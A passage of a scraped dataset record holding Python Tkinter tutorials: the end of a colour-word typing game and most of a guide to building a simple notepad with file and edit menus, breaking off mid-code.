colour\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"of the words, and not the word text!\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0font = ('Helvetica', 12))instructions.pack()\u00a0\u00a0\u00a0# add a score labelscoreLabel = tkinter.Label(root, text = \"Press enter to start\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0font = ('Helvetica', 12))scoreLabel.pack()\u00a0\u00a0# add a time left labeltimeLabel = tkinter.Label(root, text = \"Time left: \" +\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0str(timeleft), font = ('Helvetica', 12))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0timeLabel.pack()\u00a0\u00a0# add a label for displaying the colourslabel = tkinter.Label(root, font = ('Helvetica', 60))label.pack()\u00a0\u00a0# add a text entry box for# typing in colourse = tkinter.Entry(root)\u00a0\u00a0# run the 'startGame' function\u00a0# when the enter key is pressedroot.bind('<Return>', startGame)e.pack()\u00a0\u00a0# set focus on the entry boxe.focus_set()\u00a0\u00a0# start the GUIroot.mainloop()Output :https://media.geeksforgeeks.org/wp-content/uploads/tkinter_game.mp4Note : Above code may not run on online IDE because of TKinter module.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "9baaae0b7f872ea0b263e74342fcaba7",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Let\u2019s see how to create a simple notepad in Python using Tkinter. This notepad GUI will consist of various menu like file and edit, using which all functionalities like saving the file, opening a file, editing, cut and paste can be done.Now for creating this notepad, Python 3 and Tkinter should already be installed in your system. You can download suitable python package as per system requirement. After you have successfully installed python you need to install Tkinter (a Python\u2019s GUI package).Use this command to install Tkinter :\u00a0pip install python-tkImporting Tkinter :Pythonimport tkinterimport osfrom tkinter import *\u00a0# To get the space above for messagefrom tkinter.messagebox import *\u00a0# To get the dialog box to open when requiredfrom tkinter.filedialog import *Note : messagebox is used to write the message in the white box called notepad and filedialog is used for the dialog box to appear when you are opening file from anywhere in your system or saving your file in a particular position or place.\u00a0\u00a0\u00a0Adding Menu :Python# Add controls(widget)\u00a0self.__thisTextArea.grid(sticky = N + E + S + W)\u00a0# To open new fileself.__thisFileMenu.add_command(label = \"New\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = self.__newFile)\u00a0# To open a already existing fileself.__thisFileMenu.add_command(label = \"Open\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = self.__openFile)\u00a0# To save current fileself.__thisFileMenu.add_command(label = \"Save\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = self.__saveFile)\u00a0# To create a line in the dialogself.__thisFileMenu.add_separator()\u00a0# To terminateself.__thisFileMenu.add_command(label = \"Exit\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = self.__quitApplication)self.__thisMenuBar.add_cascade(label = \"File\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0menu = self.__thisFileMenu)\u00a0# To give a feature of cutself.__thisEditMenu.add_command(label = \"Cut\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = self.__cut)\u00a0# To give a feature of copyself.__thisEditMenu.add_command(label = \"Copy\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = self.__copy)\u00a0# To give a feature of pasteself.__thisEditMenu.add_command(label = \"Paste\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = self.__paste)\u00a0# To give a feature of editingself.__thisMenuBar.add_cascade(label = \"Edit\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0menu = self.__thisEditMenu)\u00a0# To create a feature of description of the notepadself.__thisHelpMenu.add_command(label = \"About Notepad\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command = self.__showAbout)self.__thisMenuBar.add_cascade(label = \"Help\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0menu = self.__thisHelpMenu)\u00a0self.__root.config(menu = self.__thisMenuBar)\u00a0self.__thisScrollBar.pack(side = RIGHT, fill = Y)\u00a0# Scrollbar will adjust automatically# according to the contentself.__thisScrollBar.config(command = self.__thisTextArea.yview)self.__thisTextArea.config(yscrollcommand = self.__thisScrollBar.set)With this code we will add the menu in the windows of our notepad and will add the things like copy, paste, save etc, to it.\u00a0\u00a0\u00a0Adding The Functionality :Pythondef __quitApplication(self):\u00a0\u00a0\u00a0\u00a0self.__root.destroy()\u00a0\u00a0\u00a0\u00a0# exit()\u00a0def __showAbout(self):\u00a0\u00a0\u00a0\u00a0showinfo(\"Notepad\", \"Mrinal Verma\")\u00a0def __openFile(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = askopenfilename(defaultextension=\".txt\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0filetypes=[(\"All Files\",\"*.*\"),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(\"Text Documents\",\"*.txt\")])\u00a0\u00a0\u00a0\u00a0\u00a0if self.__file == \"\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# no file to open\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = None\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# try to open the file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# set the window title\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.title(os.path.basename(self.__file) + \" - Notepad\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.delete(1.0,END)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file = open(self.__file,\"r\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.insert(1.0,file.read())\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.close()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __newFile(self):\u00a0\u00a0\u00a0\u00a0self.__root.title(\"Untitled - Notepad\")\u00a0\u00a0\u00a0\u00a0self.__file = None\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.delete(1.0,END)\u00a0def __saveFile(self):\u00a0\u00a0\u00a0\u00a0\u00a0if self.__file == None:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0#save as new file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = asksaveasfilename(initialfile='Untitled.txt',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0defaultextension=\".txt\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0filetypes=[(\"All Files\",\"*.*\"),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(\"Text Documents\",\"*.txt\")])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if self.__file == \"\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__file = None\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# try to save the file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file = open(self.__file,\"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.write(self.__thisTextArea.get(1.0,END))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.close()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# change the window title\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.title(os.path.basename(self.__file) + \" - Notepad\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file = open(self.__file,\"w\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.write(self.__thisTextArea.get(1.0,END))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.close()\u00a0def __cut(self):\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.event_generate(\"<<Cut>>\")\u00a0def __copy(self):\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.event_generate(\"<<Copy>>\")\u00a0def __paste(self):\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.event_generate(\"<<Paste>>\")In this we have added all the functionality that is required in the notepad, you can add other functionality too in this like the font size, font color, bold, underlined, etc.\u00a0Main Code After Merging All :Pythonimport tkinterimport os\u00a0\u00a0\u00a0from tkinter import *from tkinter.messagebox import *from tkinter.filedialog import *\u00a0class Notepad:\u00a0\u00a0\u00a0\u00a0\u00a0__root = Tk()\u00a0\u00a0\u00a0\u00a0\u00a0# default window width and height\u00a0\u00a0\u00a0\u00a0__thisWidth = 300\u00a0\u00a0\u00a0\u00a0__thisHeight = 300\u00a0\u00a0\u00a0\u00a0__thisTextArea = Text(__root)\u00a0\u00a0\u00a0\u00a0__thisMenuBar = Menu(__root)\u00a0\u00a0\u00a0\u00a0__thisFileMenu = Menu(__thisMenuBar, tearoff=0)\u00a0\u00a0\u00a0\u00a0__thisEditMenu = Menu(__thisMenuBar, tearoff=0)\u00a0\u00a0\u00a0\u00a0__thisHelpMenu = Menu(__thisMenuBar, tearoff=0)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To add scrollbar\u00a0\u00a0\u00a0\u00a0__thisScrollBar = Scrollbar(__thisTextArea)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0__file = None\u00a0\u00a0\u00a0\u00a0\u00a0def __init__(self,**kwargs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Set icon\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.wm_iconbitmap(\"Notepad.ico\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Set window size (the default is 300x300)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisWidth = kwargs['width']\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except KeyError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisHeight = kwargs['height']\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except KeyError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Set the window text\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.title(\"Untitled - Notepad\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Center the window\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0screenWidth = self.__root.winfo_screenwidth()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0screenHeight = self.__root.winfo_screenheight()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# For left-align\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0left = (screenWidth / 2) - (self.__thisWidth / 2)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# For right-align\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0top = (screenHeight / 2) - (self.__thisHeight /2)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# For top and bottom\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.geometry('%dx%d+%d+%d' % (self.__thisWidth,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisHeight,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0left, top))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To make the textarea auto resizable\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.grid_rowconfigure(0, weight=1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.grid_columnconfigure(0, weight=1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Add controls (widget)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisTextArea.grid(sticky = N + E + S + W)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To open new file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisFileMenu.add_command(label=\"New\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=self.__newFile)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To open a already existing file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisFileMenu.add_command(label=\"Open\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=self.__openFile)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To save current file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisFileMenu.add_command(label=\"Save\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=self.__saveFile)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To create a line in the dialog\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisFileMenu.add_separator()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisFileMenu.add_command(label=\"Exit\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=self.__quitApplication)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisMenuBar.add_cascade(label=\"File\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0menu=self.__thisFileMenu)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To give a feature of cut\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisEditMenu.add_command(label=\"Cut\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=self.__cut)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# to give a feature of copy\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisEditMenu.add_command(label=\"Copy\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=self.__copy)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To give a feature of paste\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisEditMenu.add_command(label=\"Paste\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=self.__paste)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To give a feature of editing\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisMenuBar.add_cascade(label=\"Edit\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0menu=self.__thisEditMenu)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To create a feature of description of the notepad\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisHelpMenu.add_command(label=\"About Notepad\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0command=self.__showAbout)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisMenuBar.add_cascade(label=\"Help\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0menu=self.__thisHelpMenu)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__root.config(menu=self.__thisMenuBar)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.__thisScrollBar.pack(side=RIGHT,fill=Y)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\